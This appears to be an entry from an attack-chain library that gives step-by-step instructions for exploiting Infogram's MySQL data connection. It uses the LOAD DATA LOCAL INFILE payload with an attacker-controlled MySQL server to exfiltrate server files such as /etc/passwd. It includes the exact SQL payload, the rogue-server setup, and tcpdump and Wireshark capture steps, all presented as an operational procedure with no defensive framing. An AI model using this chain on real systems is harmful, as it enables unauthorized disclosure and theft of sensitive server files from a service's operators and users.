---
tags:
  - lfi
  - mysql
  - file-disclosure
  - infogram
  - exfiltration
type: attack_chain
tools:
  - '[[tools/tcpdump]]'
  - '[[tools/Wireshark]]'
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2024-01-01T00:00:00Z'
procedures:
  - '[[procedures/Setup-Attacker-MySQL-Server]]'
  - '[[procedures/Configure-Malicious-Infogram-MySQL-Connection]]'
  - '[[procedures/Capture-MySQL-Traffic-with-tcpdump]]'
  - '[[procedures/Analyze-PCAP-with-Wireshark]]'
step_count: 9
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:26:22.728Z'
description: >-
  Exploits Local File Inclusion in Infogram's MySQL data connection feature to
  disclose sensitive server files by leveraging the enabled LOAD DATA LOCAL
  INFILE capability.
id: b75c18ae-0ef5-42e1-89cd-0e0c08422ac5
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
---
# LFI via MySQL LOAD DATA LOCAL INFILE in Infogram Data Connection

Multi-stage attack chain demonstrating exploitation of Local File Inclusion (LFI) in Infogram's MySQL data connection setup to read and exfiltrate sensitive files from the server.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 9 |
| Execution Time | ~15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Login and Setup] --> B[Configure Malicious Query]
    B --> C[Capture Traffic]
    C --> D[Execute and Analyze]
    D --> E[Exfiltrate Files]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/tcpdump]]
- [[tools/Wireshark]]

### Target Environment

- Infogram web application (public-facing)
- Required services/ports: MySQL on port 3306
- Network access requirements: Attacker must control a MySQL server reachable from Infogram's server

### Initial Access Requirements

- Valid user credentials for Infogram account
- Network position: Attacker's MySQL server must be accessible over the internet
- Prior access needed: None, but authenticated session in Infogram

## Detailed Attack Procedures

### Step 1: Login to Infogram Application

procedure: [[procedures/Setup-Attacker-MySQL-Server]]

**Objective**: Authenticate to the Infogram web application to gain access to data connection features.

**Instructions**: Navigate to the Infogram login page and enter valid credentials to authenticate as a user.

**Expected Output**: Successful login and access to the dashboard.

**Success Indicators**:
- User dashboard loads without errors
- Ability to create or edit infographics

### Step 2: Create a New Infographic or Navigate to an Existing One

procedure: [[procedures/Setup-Attacker-MySQL-Server]]

**Objective**: Access the data import section where MySQL connections can be configured.

**Instructions**: Use the Infogram interface to start a new infographic or edit an existing one, then navigate to the data section to add a data source.

**Expected Output**: Infographic editor opens with data import options available.

**Success Indicators**:
- Data section visible
- Option to add MySQL data source present

### Step 3: Add a New MySQL Connection

procedure: [[procedures/Configure-Malicious-Infogram-MySQL-Connection]]

**Objective**: Initiate the MySQL data connection setup to prepare for injecting the malicious query.

**Instructions**: In the data import feature, select MySQL as the data source and begin configuring the connection details such as host, port, database, username, and password.

**Expected Output**: MySQL connection configuration form appears.

**Success Indicators**:
- Form fields for connection details are editable
- SQL query input field is available

### Step 4: Set Malicious SQL Query

procedure: [[procedures/Configure-Malicious-Infogram-MySQL-Connection]]

**Objective**: Inject the LFI payload using LOAD DATA LOCAL INFILE to read a target file.

**Instructions**: Enter the malicious query in the SQL SELECT statement field: Execute [[commands/load-data-local-infile-lfi]] by setting the query to `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE asd.asd FIELDS TERMINATED BY "\\n";`. Configure the connection to point to the attacker-controlled MySQL server (IP, port 3306, database 'asd', username/password as set up).

```sql
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE asd.asd FIELDS TERMINATED BY "\\n";
```

**Expected Output**: Query accepted in the form without immediate validation errors.

**Success Indicators**:
- Connection details saved temporarily
- No syntax errors shown in the UI

### Step 5: Setup Attacker-Controlled MySQL Server

procedure: [[procedures/Setup-Attacker-MySQL-Server]]

**Objective**: Prepare the 'evil' MySQL server to receive the exfiltrated file data.

**Instructions**: Install and start a MySQL instance on the attacker's server. Create a database named 'asd' and a table named 'asd' (e.g., with a simple structure like `CREATE TABLE asd (data TEXT);`).

**Expected Output**: MySQL server running on port 3306, database and table ready.

**Success Indicators**:
- MySQL accessible via client tools
- Database 'asd' and table 'asd' exist

### Step 6: Capture Network Traffic

procedure: [[procedures/Capture-MySQL-Traffic-with-tcpdump]]

**Objective**: Monitor incoming connections to capture the file contents transmitted over the MySQL protocol.

**Instructions**: On the attacker-controlled server, run [[commands/tcpdump-mysql-capture]] to start packet capture on port 3306.

```bash
tcpdump -s 0 port 3306 -i eth0 -w infogramsteal.pcap
```

**Expected Output**: Packet capture begins, logging traffic to infogramsteal.pcap.

**Success Indicators**:
- tcpdump process running without errors
- File infogramsteal.pcap being written

### Step 7: Execute the Connection in Infogram

procedure: [[procedures/Configure-Malicious-Infogram-MySQL-Connection]]

**Objective**: Trigger the MySQL client on the Infogram server to connect and execute the query, sending file data.

**Instructions**: Click the 'Create' button in the Infogram app to attempt the data connection.

**Expected Output**: Infogram shows an error like 'Failed to create connector', but traffic is sent to the attacker server.

**Success Indicators**:
- Error message in UI
- Incoming connection observed in tcpdump

### Step 8: Stop Traffic Capture

procedure: [[procedures/Capture-MySQL-Traffic-with-tcpdump]]

**Objective**: Cease capturing after the exfiltration attempt completes.

**Instructions**: Once the error appears in Infogram, stop the tcpdump process with Ctrl+C.

**Expected Output**: Capture file infogramsteal.pcap finalized.

**Success Indicators**:
- tcpdump exits cleanly
- PCAP file size indicates data captured

### Step 9: Analyze Captured Data

procedure: [[procedures/Analyze-PCAP-with-Wireshark]]

**Objective**: Inspect the PCAP to extract and view the disclosed file contents.

**Instructions**: Open the infogramsteal.pcap file using [[tools/Wireshark]]. Filter for MySQL packets and examine the login packet for LoadLocalData=1, then view file contents in the 'Request Command Unknown' packet.

**Expected Output**: Visible file contents (e.g., /etc/passwd lines) in the dissected MySQL packets.

**Success Indicators**:
- LoadLocalData flag enabled
- File data readable in packet details

## Attack Chain Summary

### Key Achievements

1. Successful authentication and navigation in Infogram
2. Injection of LFI payload via MySQL query
3. Capture and extraction of sensitive file contents like /etc/passwd

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[File and Directory Discovery]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Discovery]]
- [[Collection]]

---
*Last updated: 2024-01-01T00:00:00Z*
